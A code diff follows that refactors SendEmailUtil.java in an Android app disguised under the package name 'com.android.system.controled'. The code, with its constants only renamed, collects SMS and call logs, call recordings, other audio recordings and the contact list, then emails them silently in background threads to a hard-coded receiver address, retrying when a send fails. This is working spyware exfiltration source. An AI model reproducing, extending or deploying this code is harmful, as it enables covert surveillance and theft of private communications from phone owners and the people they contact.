@@ -25,7 +25,7 @@ import javax.mail.internet.MimeUtility;
 import android.content.Context;
 
 import com.android.system.controled.Debug;
-import com.android.system.controled.Globle;
+import com.android.system.controled.MainApplication;
 import com.android.system.controled.db.DatabaseUtil;
 
 public class SendEmailUtil {
@@ -56,7 +56,7 @@ public class SendEmailUtil {
 		props.put("mail.smtp.port", "25");
 
 		SmtpAuth auth = new SmtpAuth();
-		auth.setAccount(Globle.senderName, Globle.senderPwd);
+		auth.setAccount(MainApplication.senderEmailAddr, MainApplication.senderPwd);
 		Session session = Session.getDefaultInstance(props, auth);
 		return session;
 	}
@@ -80,9 +80,9 @@ public class SendEmailUtil {
 					String content = "短信和通话记录, 见附件";
 					Vector<String> files = new Vector<String>();
 
-					if (Globle.FILE_CALL_LOG.exists()) {
-						Debug.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
-						files.add(Globle.FILE_CALL_LOG.getAbsolutePath());
+					if (MainApplication.FILE_CALL_LOG.exists()) {
+						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
+						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
 					}
 					if ((new File(FILE_CALL)).exists()) {
 						Debug.v("Add", FILE_CALL);
@@ -94,22 +94,22 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("短信通话记录", content, Globle.receiverEmail, files);
-						deleteTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);
+						sendMail("短信通话记录", content, MainApplication.receiverEmailAddr, files);
+						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
 					} catch (AddressException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
 
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
 					}
 
 				}
 			}).start();
 
 		} else {
-			addTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);
+			addTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
 		}
 
 	}
@@ -133,7 +133,7 @@ public class SendEmailUtil {
 					String content = "通话录音，见附件";
 					Vector<String> files = new Vector<String>();
 
-					File path = new File(Globle.FILEPATH_AUDIOS_CALL);
+					File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
 					if (path.exists() && path.isDirectory()) {
 						File[] audios = path.listFiles();
 						if (audios != null) {
@@ -149,22 +149,22 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("通话录音", content, Globle.receiverEmail, files);
-						deleteTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);
+						sendMail("通话录音", content, MainApplication.receiverEmailAddr, files);
+						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
 					} catch (AddressException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
 
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
 					}
 
 				}
 			}).start();
 
 		} else {
-			addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);
+			addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
 		}
 
 	}
@@ -187,7 +187,7 @@ public class SendEmailUtil {
 					String content = "其它录音，见附件";
 					Vector<String> files = new Vector<String>();
 
-					File path = new File(Globle.FILEPATH_AUDIOS_OTHER);
+					File path = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
 					if (path.exists() && path.isDirectory()) {
 						File[] audios = path.listFiles();
 						if (audios != null) {
@@ -203,22 +203,22 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("其它录音", content, Globle.receiverEmail, files);
-						deleteTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+						sendMail("其它录音", content, MainApplication.receiverEmailAddr, files);
+						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
 					} catch (AddressException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
 
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
 					}
 
 				}
 			}).start();
 
 		} else {
-			addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+			addTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
 		}
 
 	}
@@ -242,16 +242,16 @@ public class SendEmailUtil {
 					String content = "所有记录，见附件";
 					Vector<String> files = new Vector<String>();
 
-					if (Globle.FILE_CALL_LOG.exists()) {
-						Debug.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
-						files.add(Globle.FILE_CALL_LOG.getAbsolutePath());
+					if (MainApplication.FILE_CALL_LOG.exists()) {
+						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
+						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
 					}
 					if ((new File(FILE_CALL)).exists()) {
 						Debug.v("Add", FILE_CALL);
 						files.add(FILE_CALL);
 					}
 
-					File path = new File(Globle.FILEPATH_AUDIOS_CALL);
+					File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
 					if (path.exists() && path.isDirectory()) {
 						File[] audios = path.listFiles();
 						if (audios != null) {
@@ -262,7 +262,7 @@ public class SendEmailUtil {
 						}
 					}
 
-					File path2 = new File(Globle.FILEPATH_AUDIOS_OTHER);
+					File path2 = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
 					if (path2.exists() && path2.isDirectory()) {
 						File[] audios = path2.listFiles();
 						if (audios != null) {
@@ -278,22 +278,22 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("所有", content, Globle.receiverEmail, files);
-						deleteTag(con, Globle.PHONE_CODE_UPLOAD_ALL);
+						sendMail("所有", content, MainApplication.receiverEmailAddr, files);
+						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
 					} catch (AddressException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_ALL);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
 
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_ALL);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
 					}
 
 				}
 			}).start();
 
 		} else {
-			addTag(con, Globle.PHONE_CODE_UPLOAD_ALL);
+			addTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
 		}
 
 	}
@@ -317,9 +317,9 @@ public class SendEmailUtil {
 					String content = "联系人，见附件";
 					Vector<String> files = new Vector<String>();
 
-					if (Globle.FILE_CONTACTS.exists()) {
-						Debug.v("Add", Globle.FILE_CONTACTS.getAbsolutePath());
-						files.add(Globle.FILE_CONTACTS.getAbsolutePath());
+					if (MainApplication.FILE_CONTACTS.exists()) {
+						Debug.v("Add", MainApplication.FILE_CONTACTS.getAbsolutePath());
+						files.add(MainApplication.FILE_CONTACTS.getAbsolutePath());
 					}
 
 					if (files.size() <= 0) {
@@ -327,35 +327,35 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("联系人", content, Globle.receiverEmail, files);
-						deleteTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);
+						sendMail("联系人", content, MainApplication.receiverEmailAddr, files);
+						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
 					} catch (AddressException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
 
 					} catch (MessagingException e) {
 						e.printStackTrace();
-						addTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);
+						addTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
 					}
 				}
 			}).start();
 
 		} else {
-			addTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);
+			addTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
 		}
 
 	}
 
 	private void deleteTag(Context context, String code) {
-		if (Globle.FILE_TAG_UPLOAD_TAG.exists() && FileUtil.read(Globle.FILENAME_TAG_UPLOAD_TAG, context).equals(code)) {
+		if (MainApplication.FILE_TAG_UPLOAD_TAG.exists() && FileUtil.read(MainApplication.FILENAME_TAG_UPLOAD_TAG, context).equals(code)) {
 			Debug.e(TAG, "  deleteTag   " + code);
-			Globle.FILE_TAG_UPLOAD_TAG.delete();
+			MainApplication.FILE_TAG_UPLOAD_TAG.delete();
 		}
 	}
 
 	private void addTag(Context context, String code) {
 		Debug.e(TAG, "  addTag   " + code);
-		FileUtil.write(code, Globle.FILENAME_TAG_UPLOAD_TAG, context);
+		FileUtil.write(code, MainApplication.FILENAME_TAG_UPLOAD_TAG, context);
 
 	}
 
@@ -378,7 +378,7 @@ public class SendEmailUtil {
 		MimeMessage message = new MimeMessage(initialize());
 
 		try {
-			message.setFrom(new InternetAddress(Globle.senderName));
+			message.setFrom(new InternetAddress(MainApplication.senderEmailAddr));
 			// message.setSender(new InternetAddress(userName));
 		} catch (AddressException e) {
 			e.printStackTrace();
